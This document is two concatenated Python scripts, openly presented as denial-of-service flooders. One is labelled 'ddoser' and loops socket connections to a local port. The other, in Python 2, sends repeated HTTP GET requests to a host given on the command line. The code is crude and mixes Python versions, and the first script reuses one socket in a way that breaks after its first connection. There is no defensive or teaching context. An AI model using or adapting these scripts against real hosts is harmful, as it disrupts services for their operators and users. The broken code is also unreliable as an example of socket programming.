import socket
ddoser = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
target_ip = "127.0.0.1"
target_port = 7868

for req in range(1,1000001):
        ddoser.connect((target_ip,target_port))
        ddoser.send(b'hy,am ddoser')
      
print('done ddosing')
ddoser.close()

import socket, sys, os  
print "][ Attacking " + sys.argv[1]  + " ... ]["  
print "injecting " + sys.argv[2];  
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
for i in range(1, 1000):  
    attack()  